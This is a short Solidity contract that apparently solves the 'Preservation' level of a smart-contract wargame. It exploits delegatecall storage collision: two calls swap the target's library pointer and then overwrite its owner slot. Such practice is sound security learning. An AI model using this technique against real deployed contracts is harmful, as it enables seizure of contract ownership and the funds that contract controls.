// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/Preservation.sol";

contract PreservationAttack{
    address public timeZone1Library;
    address public timeZone2Library;
    uint public storedTime;
    function setTime(uint _time) public {
        storedTime = _time;
    }
    function att(address addr) public {
        Preservation(addr).setFirstTime(uint160(address(this)));
        Preservation(addr).setFirstTime(uint160(address(this)));
    }
}